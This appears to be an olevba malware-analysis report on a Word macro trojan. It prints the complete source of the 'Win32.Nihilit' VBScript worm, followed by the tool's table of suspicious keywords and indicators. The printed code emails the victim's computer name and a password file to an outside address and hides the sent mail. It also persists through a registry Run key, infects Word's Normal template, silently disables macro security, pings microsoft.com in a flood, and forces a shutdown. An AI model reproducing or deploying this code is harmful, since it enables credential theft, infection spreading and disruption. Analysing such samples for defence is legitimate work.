olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.SecDown-af3da534f4528e6687bc53675020c20c292cbdac
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan.MSWord.SecDown-af3da534f4528e6687bc53675020c20c292cbdac 
in file: Trojan.MSWord.SecDown-af3da534f4528e6687bc53675020c20c292cbdac - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<head>
<title>(c) by Necronomikon [Zerogravity]</title>
</head>
<body text="#009900" bgcolor="#000000">
<center><font size=+4>You are</font></center>
<br><center><font color="#FFFFFF"><font size=+4>
infected with</font></font></center>
<br><font color="#CC0000"><center><font size=+4>Win32.Nihilit</font></font></center>
<Script Language = "JavaScript">
<!--
var userAgent=navigator.appName;
var agentInfo=userAgent.substring(0, 1);
if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet
Explorer")
self.close()
}
//-->
</SCRIPT>
<Script Language=vbs>
dim out, Mail, win
MsgBox "(c)by Necronomikon/ZeroGravity", 32,"Win32.Nihilit"
set win = fso.getspecialfolder(0)
Set out = CreateObject("Outlook.Application")
Set Mail = Out.CreateItem(0)
Mail.BCC = "nihilitvx@yahoo.de"
Mail.Subject = "Network Info"
Set net = CreateObject("WScript.Network")
Mail.Body = "Network computer name: """ & net.ComputerName & Chr(34)
Mail.Attachments.add win&"\mypasses.txt"
Mail.DeleteAfterSubmit = True
Mail.Send
Msgbox "(c)2002 by Necronomikon/ZeroGravity",64,"***Win32.Nihilit***"
reg()
word()
ddos()
sub reg()
dim a, nec
Set nec = CreateObject("WScript.Shell")
nec.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*HLM",_
wscript.scriptfullname
end sub
sub word()
norm ="Private Sub Document_Close()" & vbCrLf & _
"On Error Resume Next" & vbCrLf & _
"Open ""c:\word.txt"" For Output As 1" & vbCrLf & _
"Print #1, ""Private Sub Document_Open""" & vbCrLf & _
"Print #1, ""On Error Resume Next""" & vbCrLf & _
"Print #1, ""rem Win32.Nihilit""" & vbCrLf & _
"Print #1, ""rem (c)by Necronomikon/ZeroGravity""" & vbCrLf & _
"Print #1, ""rem thx to Alcopaul for MV Code""" & vbCrLf & _
"Print #1, ""obj = ActiveDocument.Shapes(1).OLEFormat.ClassType""" & vbCrLf & _
"Print #1, ""With ActiveDocument.Shapes(1).OLEFormat""" & vbCrLf & _
"Print #1, ""    .ActivateAs ClassType:=obj""" & vbCrLf & _
"Print #1, ""    .Activate""" & vbCrLf & _
"Print #1, ""End With""" & vbCrLf & _
"Print #1, ""end sub""" & vbCrLf & _
"Close 1" & vbCrLf & _
"Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
"Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule" & vbCrLf & _
"Set iw = fso.OpenTextFile(""c:\word.txt"", 1, True)" & vbCrLf & _
"nt.DeleteLines 1, nt.CountOfLines" & vbCrLf & _
"i = 1 " & vbCrLf & _
"Do While iw.atendofstream <> True" & vbCrLf & _
"b = iw.readline" & vbCrLf & _
"nt.InsertLines i, b " & vbCrLf & _
"i = i + 1 " & vbCrLf & _
"Loop" & vbCrLf & _
"ActiveDocument.Shapes.AddOLEObject _" & vbCrLf & _
"FileName:=""c:\windows\bitchnec.vbs"", _" & vbCrLf & _
"LinkToFile:=False" & vbCrLf & _
"ActiveDocument.Save" & vbCrLf & _
"Open ""c:\nec.reg"" For Output As 2" & vbCrLf & _
"Print #2, ""REGEDIT4""" & vbCrLf & _
"Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]""" & vbCrLf & _
"Print #2, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #2, ""[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]""" & vbCrLf & _
"Print #2, """"""Level""""=dword:00000001""" & vbCrLf & _
"Print #2, """"""AccessVBOM""""=dword:00000001""" & vbCrLf & _
"Close 2" & vbCrLf & _
"Shell ""regedit /s c:\nec.reg"", vbHide" & vbCrLf & _
"Kill ""c:\nec.reg""" & vbCrLf & _
"End Sub"
Set fso = CreateObject("Scripting.FileSystemObject")
set f = fso.createtextfile("c:\windows\noname.txt")
f.write norm
f.Close
Set nword = CreateObject("Word.Application")
nword.Visible = False
Set nt = nword.NormalTemplate.vbproject.vbcomponents(1).codemodule
Set iw = fso.OpenTextFile("c:\\windows\noname.txt", 1, True)
nt.DeleteLines 1, nt.CountOfLines
i = 1
Do While iw.atendofstream <> True
b = iw.readline
nt.InsertLines i, b
i = i + 1
Loop
nword.NormalTemplate.Save
nword.NormalTemplate.Close
end sub
sub ddos()
Set a = CreateObject("WScript.Shell")
a.run ("c:\windows\ping.exe -t -l 10000 www.microsoft.com")
end sub
nec.run "RUNDLL32.EXE user.exe,exitwindows"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |bitchnec.vbs        |Executable file name                         |
|IOC       |nec.reg             |Executable file name                         |
|IOC       |ping.exe            |Executable file name                         |
|IOC       |RUNDLL32.EXE        |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

